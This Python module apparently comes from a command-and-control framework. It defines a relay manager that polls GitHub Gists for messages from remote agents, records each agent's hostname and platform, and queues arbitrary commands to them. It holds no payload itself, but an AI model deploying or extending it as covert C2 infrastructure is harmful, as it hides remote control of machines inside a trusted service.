"""
Relay Manager – Handles multiple relays, agent tracking, and WebSocket updates.
"""

import threading
import time
import json
import uuid
from core.logger import setup_logger
from console.github_relay import GitHubGistRelay

log = setup_logger("relay_manager")

class RelayManager:
    def __init__(self):
        self.relays = {}           # relay_id -> relay object
        self.agents = {}           # agent_id -> agent info
        self.tasks = {}             # task_id -> task info
        self.ws_callbacks = []      # list of callbacks for WebSocket broadcast
        self._poll_threads = {}

    def register_callback(self, callback):
        """Callback function to call when agents or results update."""
        self.ws_callbacks.append(callback)

    def add_github_relay(self, relay_id: str, token: str, gist_id: str):
        relay = GitHubGistRelay(token, gist_id)
        self.relays[relay_id] = {"type": "github", "relay": relay}
        t = threading.Thread(target=self._poll_github, args=(relay_id,), daemon=True)
        t.start()
        self._poll_threads[relay_id] = t
        log.info(f"Added GitHub relay: {relay_id}")

    def _poll_github(self, relay_id):
        relay_info = self.relays.get(relay_id)
        if not relay_info:
            return
        relay = relay_info["relay"]
        while relay_id in self.relays:
            try:
                for message in relay.get_messages():
                    self._process_message(relay_id, message)
                time.sleep(relay.poll_interval)
            except Exception as e:
                log.error(f"Polling error {relay_id}: {e}")
                time.sleep(10)

    def _process_message(self, relay_id, message):
        """Process incoming message from agent."""
        msg_type = message.get("type")
        agent_id = message.get("agent_id")
        if not agent_id:
            return

        if msg_type == "register":
            self.agents[agent_id] = {
                "agent_id": agent_id,
                "platform": message.get("platform", "unknown"),
                "hostname": message.get("hostname", "unknown"),
                "relay_id": relay_id,
                "first_seen": message.get("timestamp", time.time()),
                "last_seen": time.time(),
                "status": "online"
            }
            log.info(f"✅ Agent registered: {agent_id} via {relay_id}")
            self._broadcast("agent_connected", self.agents[agent_id])

        elif msg_type == "heartbeat":
            if agent_id in self.agents:
                self.agents[agent_id]["last_seen"] = time.time()
                self.agents[agent_id]["status"] = "online"
                log.debug(f"Heartbeat from {agent_id}")

        elif msg_type == "result":
            task_id = message.get("task_id")
            result = message.get("result")
            log.info(f"Result from {agent_id} for task {task_id}")
            if task_id in self.tasks:
                self.tasks[task_id]["status"] = "completed"
                self.tasks[task_id]["result"] = result
                self.tasks[task_id]["completed_at"] = time.time()
            self._broadcast("task_result", {"agent_id": agent_id, "task_id": task_id, "result": result})

        elif msg_type == "ack":
            task_id = message.get("task_id")
            log.debug(f"Ack from {agent_id} for task {task_id}")
            if task_id in self.tasks:
                self.tasks[task_id]["status"] = "acknowledged"

        elif msg_type == "status":
            task_id = message.get("task_id")
            status = message.get("status")
            msg = message.get("message")
            log.debug(f"Status from {agent_id} task {task_id}: {status}")
            if task_id in self.tasks:
                self.tasks[task_id]["status"] = status
                self.tasks[task_id]["message"] = msg
            self._broadcast("task_status", {"agent_id": agent_id, "task_id": task_id, "status": status, "message": msg})

    def send_command(self, agent_id: str, command: str) -> str:
        """Send a command to an agent via appropriate relay."""
        if agent_id not in self.agents:
            log.error(f"Agent {agent_id} not found")
            return None
        relay_id = self.agents[agent_id]["relay_id"]
        relay_info = self.relays.get(relay_id)
        if not relay_info:
            log.error(f"Relay {relay_id} not found")
            return None
        relay = relay_info["relay"]
        task_id = str(uuid.uuid4())
        self.tasks[task_id] = {
            "agent_id": agent_id,
            "command": command,
            "status": "queued",
            "created_at": time.time()
        }
        success = relay.send_command(agent_id, command, task_id)
        if success:
            self.tasks[task_id]["status"] = "sent"
        else:
            self.tasks[task_id]["status"] = "failed"
        return task_id

    def _broadcast(self, event, data):
        for cb in self.ws_callbacks:
            try:
                cb(event, data)
            except Exception as e:
                log.error(f"Callback error: {e}")

    def get_relays(self):
        """Return list of active relays."""
        return [{"id": rid, "type": r["type"]} for rid, r in self.relays.items()]

    def get_agents(self):
        return list(self.agents.values())

    def get_tasks(self, agent_id=None):
        if agent_id:
            return [t for t in self.tasks.values() if t["agent_id"] == agent_id]
        return list(self.tasks.values())

relay_manager = RelayManager()
